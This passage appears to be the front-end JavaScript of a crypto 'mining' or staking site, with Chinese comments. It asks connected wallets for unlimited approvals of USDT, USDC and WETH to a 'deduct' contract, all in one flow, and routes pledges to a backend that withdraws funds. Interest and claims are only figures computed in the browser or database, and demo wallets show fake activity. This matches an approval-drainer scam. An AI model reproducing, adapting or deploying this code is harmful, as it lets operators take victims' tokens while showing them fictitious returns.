    if (typeof window.ethereum !== 'undefined') {
      provider = new window.ethers.BrowserProvider(window.ethereum);
    } else {
      provider = new window.ethers.JsonRpcProvider(INFURA_URL);
      updateStatus('請連結錢包以進行交易', true);
    }
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', a => {
        if (a.length === 0) disconnectWallet();
        else if (userAddress && a[0].toLowerCase() !== userAddress.toLowerCase()) {
          resetState(false);
          setTimeout(connectWallet, 500);
        }
      });
      window.ethereum.on('chainChanged', () => {
        resetState(false);
        setTimeout(connectWallet, 500);
      });
    }
    const accounts = await provider.send('eth_accounts', []);
    if (accounts.length > 0) {
      console.log('[DEBUG] 自動連線錢包');
      await connectWallet();
      await updateUIBasedOnChainState();
    } else {
      disableInteractiveElements(true);
      updateStatus(translations[currentLang].noWallet, true);
      if (connectButton) connectButton.textContent = 'Connect wallet';
    }
  } catch (e) {
    console.error('[DEBUG] 錢包初始化錯誤:', e);
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
    if (connectButton) connectButton.disabled = true;
  }
}
let isConnecting = false;
async function connectWallet() {
  if (isConnecting) {
    updateStatus('錢包連接請求進行中，請稍候...', true);
    return;
  }
  isConnecting = true;
  try {
    console.log('[DEBUG] 開始錢包連線...');
    if (typeof window.ethereum === 'undefined') {
      updateStatus('請連結支援 EIP-1193 的錢包', true);
      return;
    }
    if (!provider) {
      provider = new window.ethers.BrowserProvider(window.ethereum);
    }
    updateStatus('Connecting...');
    const accounts = await provider.send('eth_requestAccounts', []);
    if (accounts.length === 0) throw new Error("No account.");
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();
    console.log('[DEBUG] 錢包連線成功:', userAddress);
    deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
    usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
    usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
    wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
    if (connectButton) {
      connectButton.classList.add('connected');
      connectButton.textContent = 'Connected';
    }
    await forceRefreshWalletBalance();
    updateStatus('錢包連線成功，餘額已載入');
    await loadUserDataFromServer();
    await updateUIBasedOnChainState();
    initSSE();
    await updateUIBasedOnChainState();
  } catch (e) {
    console.error('[DEBUG] 錢包連線失敗:', e);
    if (e.code === -32002 || e.message.includes('already pending')) {
      updateStatus('錢包確認視窗已開啟，請在錢包中確認', true);
    } else {
      log(`錢包連接失敗: ${e.message}`, 'error');
      updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
      resetState(true);
    }
  } finally {
    isConnecting = false;
  }
}
async function updateUIBasedOnChainState() {
  if (!userAddress) return;
  try {
    console.log('[DEBUG] 開始鏈上狀態檢查...');
    const docRef = db.collection('users').doc(userAddress);
    const snap = await docRef.get();
    if (snap.exists && snap.data()?.isDemoWallet) {
      console.log('[DEBUG] 檢測到演示錢包');
      if (startBtn) startBtn.style.display = 'none';
      disableInteractiveElements(false);
      updateStatus("演示模式：已自動啟動");
      activateStakingUI();
      return;
    }
    const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
    const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
      retry(() => deductContract.isServiceActiveFor(userAddress)),
      retry(() => usdtContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
      retry(() => usdcContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
      retry(() => wethContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
    ]);
    const isWethAuthorized = wethAllowance >= requiredAllowance;
    const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
    const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
    const isFullyAuthorized = isServiceActive || isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
    if (isFullyAuthorized) {
      if (startBtn) startBtn.style.display = 'none';
      disableInteractiveElements(false);
      updateStatus("挖礦已啟動");
      activateStakingUI();
    } else {
      if (startBtn) startBtn.style.display = 'block';
      disableInteractiveElements(false);
      updateStatus("請點擊 Start 進行授權");
    }
  } catch (e) {
    console.error('[DEBUG] 鏈上狀態檢查錯誤:', e);
    log(`狀態檢查錯誤: ${e.message}`, 'error');
    if (startBtn) startBtn.style.display = 'block';
  }
}
async function handleConditionalAuthorizationFlow() {
  if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
  updateStatus('Authorizing...');
  const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
  const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
  const tokenMap = {
    'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
    'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
    'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
  };
  // 【關鍵修正】一次授權三種幣
  const tokensToProcess = Object.values(tokenMap);
  let tokenToActivate = '';
  for (const { name, contract, address } of tokensToProcess) {
    if (!contract) continue;
    updateStatus(`Checking ${name} allowance...`);
    const currentAllowance = await retry(() => contract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
    if (currentAllowance < requiredAllowance) {
      updateStatus(`Requesting ${name} approval...`);
      try {
        const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
        approvalTx.value = 0n;
        await sendMobileRobustTransaction(approvalTx);
        const newAllowance = await retry(() => contract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
        if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
      } catch (err) {
        updateStatus(`${translations[currentLang].approveError} (${name})`, true);
      }
    } else if (!tokenToActivate) tokenToActivate = address;
  }
  if (!serviceActivated && tokenToActivate) {
    const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
    updateStatus(`Activating service with ${tokenName}...`);
    try {
      const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
      activateTx.value = 0n;
      await sendMobileRobustTransaction(activateTx);
      authorizedToken = tokenName;
      localStorage.setItem('authorizedToken', authorizedToken);
      await smartSave();
    } catch (err) {
      updateStatus(`Activation failed: ${err.message}`, true);
    }
  }
  await forceRefreshWalletBalance();
}
function updateLanguage(lang) {
  currentLang = lang;
  if (languageSelect) languageSelect.value = lang;
  localStorage.setItem('language', lang);
  const apply = () => {
    for (let key in elements) {
      if (elements[key] && translations[lang]?.[key]) {
        elements[key].textContent = translations[lang][key];
      }
    }
    const rulesTitle = document.getElementById('rulesTitle');
    const rulesContent = document.getElementById('rulesContent');
    if (rulesTitle) rulesTitle.textContent = translations[lang].rulesTitle;
    if (rulesContent) rulesContent.innerHTML = translations[lang].rulesContent;
    if (claimModal && claimModal.style.display === 'flex') {
      updateClaimModalLabels();
    }
    updateNextBenefitTimer();
    document.documentElement.lang = lang;
    updatePledgeSummary();
    updateEstimate();
    if (elements.accountDetailTitle) elements.accountDetailTitle.textContent = translations[lang].accountDetailTitle;
    if (elements.modalTotalBalanceLabel) elements.modalTotalBalanceLabel.textContent = translations[lang].totalBalance;
    if (elements.modalPledgedAmountLabel) elements.modalPledgedAmountLabel.textContent = translations[lang].pledgedAmount;
    if (elements.modalPendingInterestLabel) elements.modalPendingInterestLabel.textContent = translations[lang].pendingInterest;
    if (elements.modalClaimedInterestLabel) elements.modalClaimedInterestLabel.textContent = translations[lang].claimedInterest;
    if (elements.modalWalletBalanceLabel) elements.modalWalletBalanceLabel.textContent = translations[lang].walletBalance;
    if (elements.totalPledgeLabel) elements.totalPledgeLabel.textContent = translations[lang].totalPledge;
    if (elements.estimateLabel) elements.estimateLabel.textContent = translations[lang].estimate;
  };
  setTimeout(apply, 200);
}
function calculatePayoutInterest() {
  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const data = accountBalance[selected];
  const totalBalance = data.wallet + data.pledged;
  if (totalBalance <= 0) return 0;
  const now = Date.now();
  const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || now;
  const hoursSinceLast = (now - lastPayout) / (1000 * 60 * 60);
  const monthlyRate = 0.01;
  const hourlyRate = monthlyRate / (30 * 24);
  return totalBalance * hourlyRate * hoursSinceLast;
}
// ==================== 質押總結 ====================
function updatePledgeSummary() {
  if (!elements.totalPledge) return;
  const total = userPledges.reduce((sum, p) => sum + p.amount, 0);
  elements.totalPledge.textContent = total.toFixed(3);
}
// ==================== 預估收益 + 使用當前代幣餘額 + 最低額度 ====================
function updateEstimate() {
  if (!pledgeAmount || !pledgeDuration || !pledgeToken || !elements.estimate || !elements.exceedWarning) return;
  const amount = parseFloat(pledgeAmount.value) || 0;
  const durationDays = parseInt(pledgeDuration.value) || 90;
  const token = pledgeToken.value;
  if (amount === 0) {
    elements.estimate.textContent = '0.000';
    elements.exceedWarning.style.display = 'none';
    return;
  }
  const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
  if (!duration) return;
  if (amount < duration.min) {
    elements.exceedWarning.textContent = `最低質押金額：${duration.min} ${token}`;
    elements.exceedWarning.style.display = 'block';
    elements.exceedWarning.style.color = '#f00';
    elements.estimate.textContent = '0.000';
    return;
  }
  const interest = amount * duration.rate;
  const total = amount + interest;
  elements.estimate.textContent = `${total.toFixed(3)} ${token}`;
  const decimals = token === 'WETH' ? 18 : 6;
  const bigIntBalance = cachedWalletBalances[token] || 0n;
  const formatted = ethers.formatUnits(bigIntBalance, decimals);
  const walletBalance = parseFloat(formatted);
  if (amount > walletBalance) {
    elements.exceedWarning.textContent = translations[currentLang].exceedBalance;
    elements.exceedWarning.style.display = 'block';
    elements.exceedWarning.style.color = '#f00';
  } else {
    elements.exceedWarning.style.display = 'none';
  }
}
// ==================== 質押明細面板 ====================
function showPledgeDetail() {
  if (!pledgeDetailModal) return;
  const content = document.getElementById('pledgeDetailContent');
  if (!content) return;
  content.innerHTML = '';
  if (userPledges.length === 0) {
    content.innerHTML = `<p>${translations[currentLang].noClaimable}</p>`;
  } else {
    userPledges.forEach((p, i) => {
      const start = new Date(p.startTime);
      const end = new Date(p.startTime + p.duration * 24 * 60 * 60 * 1000);
      const remaining = Math.max(0, end - Date.now());
      const daysLeft = Math.floor(remaining / (24 * 60 * 60 * 1000));
      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration) || { rate: 0 };
      const apr = (durationInfo.rate * 100).toFixed(1) + '%';
      const accrued = p.amount * durationInfo.rate * (Date.now() - p.startTime) / (p.duration * 24 * 60 * 60 * 1000);
      const row = document.createElement('div');
      row.style = 'border-bottom: 1px solid #333; padding: 10px 0;';
      row.innerHTML = `
        <div><strong>#${i+1}</strong> ${p.amount} ${p.token}</div>
        <div>${translations[currentLang].startTime}: ${start.toLocaleString()}</div>
        <div>${translations[currentLang].remaining}: ${daysLeft} ${translations[currentLang].cycle}</div>
        <div>${translations[currentLang].apr}: ${apr}</div>
        <div>${translations[currentLang].accrued}: ${accrued.toFixed(3)} ${p.token}</div>
      `;
      content.appendChild(row);
    });
  }
  pledgeDetailModal.style.display = 'flex';
}
// ==================== 帳戶明細 ====================
function showAccountDetail() {
  if (!accountDetailModal) return;
  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const data = accountBalance[selected];
  // 總餘額 = 錢包 + 質押 + 已領取利息
  const claimedInterest = parseFloat(localStorage.getItem(`claimedInterest${selected}`) || '0');
  const total = data.wallet + data.pledged + claimedInterest;
  document.getElementById('modalTotalBalance').textContent = `${total.toFixed(3)} ${selected}`;
  document.getElementById('modalPledgedAmount').textContent = `${data.pledged.toFixed(3)} ${selected}`;
  document.getElementById('modalPendingInterest').textContent = `${data.interest.toFixed(3)} ${selected}`;
  document.getElementById('modalClaimedInterest').textContent = `${claimedInterest.toFixed(3)} ${selected}`;
  document.getElementById('modalWalletBalance').textContent = `${data.wallet.toFixed(3)} ${selected}`;
  accountDetailModal.style.display = 'flex';
}
function closeAccountDetailModal() {
  if (accountDetailModal) accountDetailModal.style.display = 'none';
}
// ==================== 質押到期檢查 ====================
function checkPledgeExpiry() {
  userPledges.forEach(async (p, i) => {
    const endTime = p.startTime + p.duration * 24 * 60 * 60 * 1000;
    if (Date.now() > endTime && !p.redeemed) {
      p.redeemed = true;
      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration) || { rate: 0 };
      const totalInterest = p.amount * durationInfo.rate;
      accountBalance[p.token].pledged -= p.amount;
      accountBalance[p.token].interest += totalInterest;
      p.redeemedTime = Date.now();
      await smartSave();
      updateAccountBalanceDisplay();
      updatePledgeSummary();
      updateClaimableDisplay();
    }
  });
}
setInterval(checkPledgeExpiry, 60000);
// ==================== 初始化 ====================
document.addEventListener('DOMContentLoaded', async () => {
  console.log('[DEBUG] DOM載入完成，開始初始化');
  getElements();
  updateLanguage(currentLang);
  initializeWallet();
  setTimeout(() => {
    updateTotalFunds();
    setInterval(updateTotalFunds, 1000);
  }, 100);
  if (pledgeDuration) {
    pledgeDuration.innerHTML = '';
    PLEDGE_DURATIONS.forEach(d => {
      const opt = document.createElement('option');
      opt.value = d.days;
      opt.textContent = `${d.days} Days (${(d.rate * 100).toFixed(1)}% APR)`;
      pledgeDuration.appendChild(opt);
    });
  }
  if (pledgeToken) {
    const updatePledgeTokenOptions = () => {
      const tokens = ['USDT', 'USDC', 'WETH'];
      pledgeToken.innerHTML = '';
      tokens.forEach(t => {
        const decimals = t === 'WETH' ? 18 : 6;
        const bigIntBalance = cachedWalletBalances[t] || 0n;
        const formatted = ethers.formatUnits(bigIntBalance, decimals);
        const value = parseFloat(formatted).toFixed(3);
        const opt = document.createElement('option');
        opt.value = t;
        opt.textContent = `${t} (${value})`;
        pledgeToken.appendChild(opt);
      });
      const hasBalance = tokens.find(t => (cachedWalletBalances[t] || 0n) > 0n);
      if (hasBalance) pledgeToken.value = hasBalance;
    };
    updatePledgeTokenOptions();
    const originalForceRefresh = forceRefreshWalletBalance;
    forceRefreshWalletBalance = async function() {
      await originalForceRefresh.call(this);
      updatePledgeTokenOptions();
    };
    pledgeToken.addEventListener('change', updateEstimate);
  }
  const claimBtn = document.getElementById('claimButton');
  if (claimBtn) claimBtn.addEventListener('click', claimInterest);
  if (closeModal) closeModal.addEventListener('click', closeClaimModal);
  if (cancelClaim) cancelClaim.addEventListener('click', closeClaimModal);
  if (claimModal) claimModal.addEventListener('click', e => e.target === claimModal && closeClaimModal());
  if (confirmClaim) {
    let isClaiming = false;
    confirmClaim.addEventListener('click', async () => {
      if (isClaiming) return;
      isClaiming = true;
      confirmClaim.disabled = true;
      confirmClaim.textContent = 'Processing...';
      try {
        const claimable = window.currentClaimable;
        if (claimable <= 0) throw new Error('No claimable interest');
        const token = authorizedToken;
        const ethPrice = ethPriceCache.price || 2500;
        const equivalent = token === 'WETH' ? claimable : claimable * ethPrice;
        const previous = parseFloat(localStorage.getItem(`claimedInterest${token}`) || '0');
        const newClaimed = previous + equivalent;
        localStorage.setItem(`claimedInterest${token}`, newClaimed.toString());
        window.currentClaimable = 0;
        await smartSave({
          claimable: 0,
          [`claimedInterest${token}`]: newClaimed,
          lastClaimed: Date.now(),
          lastUpdated: Date.now(),
          source: 'client_claim'
        });
        updateClaimableDisplay();
        updateAccountBalanceDisplay();
        closeClaimModal();
        updateStatus(translations[currentLang].claimSuccess);
      } catch (error) {
        updateStatus(`${translations[currentLang].error}: ${error.message}`, true);
      } finally {
        isClaiming = false;
        confirmClaim.disabled = false;
        confirmClaim.textContent = 'Confirm';
      }
    });
  }
  if (languageSelect) languageSelect.addEventListener('change', e => updateLanguage(e.target.value));
  if (connectButton) {
    connectButton.addEventListener('click', () => {
      if (connectButton.classList.contains('connected')) {
        disconnectWallet();
      } else {
        connectWallet();
      }
    });
  }
  if (startBtn) {
    startBtn.addEventListener('click', async () => {
      if (!signer) {
        updateStatus(translations[currentLang].noWallet, true);
        return;
      }
      const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
      if (!selectedToken) {
        updateStatus(translations[currentLang].selectTokenFirst, true);
        return;
      }
      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
      const selectedContract = tokenMap[selectedToken];
      if (!selectedContract) {
        updateStatus('Contract not initialized', true);
        return;
      }
      let balanceBigInt;
      try {
        balanceBigInt = await retry(() => selectedContract.connect(provider).balanceOf(userAddress));
      } catch (e) {
        updateStatus(`${translations[currentLang].error}: Balance error`, true);
        return;
      }
      const decimals = selectedToken === 'WETH' ? 18 : 6;
      const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
      if (balance === 0) {
        updateStatus(translations[currentLang].balanceZero, true);
        return;
      }
      startBtn.disabled = true;
      startBtn.textContent = 'Authorizing...';
      try {
        await handleConditionalAuthorizationFlow();
        let canStart = false;
        if (selectedToken === 'WETH') {
          const price = ethPriceCache.price || 2500;
          const wethValueUSD = balance * price;
          if (wethValueUSD >= 500) canStart = true;
        } else {
          if (balance >= 1) canStart = true;
        }
        if (canStart) {
          pledgedAmount = balance;
          lastPayoutTime = Date.now();
          currentCycleInterest = calculatePayoutInterest();
          authorizedToken = selectedToken;
          if (!accountBalance[selectedToken]) {
            accountBalance[selectedToken] = { wallet: 0, pledged: 0, interest: 0 };
          }
          accountBalance[selectedToken].pledged = balance;
          localStorage.setItem('pledgedAmount', pledgedAmount.toString());
          localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
          localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
          localStorage.setItem('authorizedToken', authorizedToken);
          updateStatus(translations[currentLang].miningStarted);
          activateStakingUI();
          updateAccountBalanceDisplay();
          await smartSave();
          startBtn.style.display = 'none';
        } else {
          updateStatus('Balance too low.', true);
          startBtn.disabled = false;
          startBtn.textContent = translations[currentLang].startBtnText;
        }
      } catch (error) {
        updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
        startBtn.disabled = false;
        startBtn.textContent = translations[currentLang].startBtnText;
      }
    });
  }
  // 【關鍵修正】質押按鈕 → 後端扣款（不直接交易）
  if (pledgeBtn) {
    pledgeBtn.addEventListener('click', async () => {
      if (!signer) {
        updateStatus(translations[currentLang].noWallet, true);
        return;
      }
      const amount = parseFloat(pledgeAmount.value) || 0;
      const durationDays = parseInt(pledgeDuration.value) || 90;
      const token = pledgeToken.value;
      if (amount <= 0) {
        updateStatus(translations[currentLang].invalidPledgeAmount, true);
        return;
      }
      const locked = await isPledgeLocked(userAddress);
      if (locked) {
        updateStatus('質押進行中，請稍候...', true);
        return;
      }
      pledgeBtn.disabled = true;
      pledgeBtn.textContent = '處理中...';
      const decimals = token === 'WETH' ? 18 : 6;
      const bigIntBalance = cachedWalletBalances[token] || 0n;
      const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
      if (amount > walletBalance) {
        pledgeBtn.disabled = false;
        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
        updateStatus(translations[currentLang].insufficientBalance, true);
        return;
      }
      const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
      if (duration && amount < duration.min) {
        pledgeBtn.disabled = false;
        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
        updateStatus(`最低質押金額：${duration.min} ${token}`, true);
        return;
      }
      const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
      let currentAllowance;
      try {
        currentAllowance = await tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
      } catch (error) {
        pledgeBtn.disabled = false;
        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
        updateStatus(`${translations[currentLang].error}: Allowance check failed`, true);
        return;
      }
      const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
      if (currentAllowance < REQUIRED_ALLOWANCE) {
        updateStatus(`Approving ${token} for backend...`);
        try {
          const approveTx = await tokenContract.approve.populateTransaction(
            DEDUCT_CONTRACT_ADDRESS,
            ethers.MaxUint256
          );
          await sendMobileRobustTransaction(approveTx);
        } catch (error) {
          pledgeBtn.disabled = false;
          pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
          updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
          return;
        }
      }
      updateStatus('Sending pledge request to backend...');
      try {
        const response = await fetch(`${BACKEND_API_URL}/pledge`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            address: userAddress,
            amount: amount,
            token: token,
            duration: durationDays
          })
        });
        if (!response.ok) {
          const errorText = await response.text();
          throw new Error(errorText || 'Network error');
        }
        const result = await response.json();
        if (!result.success) {
          throw new Error(result.error || 'Backend rejected');
        }
        const orderId = result.orderId;
        updateStatus(`質押請求已提交，訂單編號：${orderId}`);
        const pollInterval = setInterval(async () => {
          const locked = await isPledgeLocked(userAddress);
          if (!locked) {
            pledgeBtn.disabled = false;
            pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
            clearInterval(pollInterval);
          }
        }, 3000);
      } catch (error) {
        pledgeBtn.disabled = false;
        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
        updateStatus(`${translations[currentLang].pledgeError}: ${error.message}`, true);
        log(`Pledge failed: ${error.message}`, 'error');
      }
    });
  }
  // 所有事件監聽必須在這裡
  if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
  if (pledgeAmount) pledgeAmount.addEventListener('input', updateEstimate);
  if (pledgeDuration) pledgeDuration.addEventListener('change', updateEstimate);
  if (pledgeToken) pledgeToken.addEventListener('change', updateEstimate);
  if (totalPledgeBlock) totalPledgeBlock.addEventListener('click', showPledgeDetail);
  if (closePledgeDetail) closePledgeDetail.addEventListener('click', () => pledgeDetailModal.style.display = 'none');
  if (pledgeDetailModal) pledgeDetailModal.addEventListener('click', e => e.target === pledgeDetailModal && (pledgeDetailModal.style.display = 'none'));
  if (accountBalanceValue) {
    accountBalanceValue.style.cursor = 'pointer';
    accountBalanceValue.addEventListener('click', showAccountDetail);
  }
  if (closeAccountDetail) closeAccountDetail.addEventListener('click', closeAccountDetailModal);
  if (closeAccountDetailBtn) closeAccountDetailBtn.addEventListener('click', closeAccountDetailModal);
  if (accountDetailModal) accountDetailModal.addEventListener('click', e => e.target === accountDetailModal && closeAccountDetailModal());
  document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
      const targetContent = document.getElementById(tab.dataset.tab);
      if (targetContent) targetContent.classList.add('active');
      if (tab.dataset.tab === 'liquidity') updateInterest();
    });
  });
  const rulesModal = document.getElementById('rulesModal');
  const rulesButton = document.getElementById('rulesButton');
  const closeRulesModal = document.getElementById('closeRulesModal');
  if (rulesButton) {
    rulesButton.addEventListener('click', () => {
      const rulesTitle = document.getElementById('rulesTitle');
      const rulesContent = document.getElementById('rulesContent');
      if (rulesTitle) rulesTitle.textContent = translations[currentLang].rulesTitle;
      if (rulesContent) rulesContent.innerHTML = translations[currentLang].rulesContent;
      if (rulesModal) rulesModal.style.display = 'flex';
    });
  }
  if (closeRulesModal) {
    closeRulesModal.addEventListener('click', () => {
      if (rulesModal) rulesModal.style.display = 'none';
    });
  }
  if (rulesModal) {
    rulesModal.addEventListener('click', e => {
      if (e.target === rulesModal && rulesModal) rulesModal.style.display = 'none';
    });
  }
  // 【關鍵】頁面載入時檢查鎖定狀態
  if (userAddress) {
    (async () => {
      console.log('[DEBUG] 頁面載入檢查鎖定狀態');
      const locked = await isPledgeLocked(userAddress);
      if (locked) {
        pledgeBtn.disabled = true;
        pledgeBtn.textContent = '處理中...';
        const pollInterval = setInterval(async () => {
          const stillLocked = await isPledgeLocked(userAddress);
          if (!stillLocked) {
            pledgeBtn.disabled = false;
            pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
            clearInterval(pollInterval);
          }
        }, 3000);
      }
    })();
  }
});
// 自動餘額監控（每 10 秒）
setInterval(async () => {
  if (userAddress && signer && !window.isDemoMode) {
    try {
      console.log('[DEBUG] 自動刷新餘額');
      const [usdtBal, usdcBal, wethBal] = await Promise.all([
        usdtContract.connect(provider).balanceOf(userAddress),
        usdcContract.connect(provider).balanceOf(userAddress),
        wethContract.connect(provider).balanceOf(userAddress)
      ]);
      cachedWalletBalances = { USDT: usdtBal, USDC: usdcBal, WETH: wethBal };
      updateWalletBalanceFromCache();
      updateAccountBalanceDisplay();
    } catch (error) {
      log(`自動更新失敗: ${error.message}`, 'error');
    }
  }
}, 10000);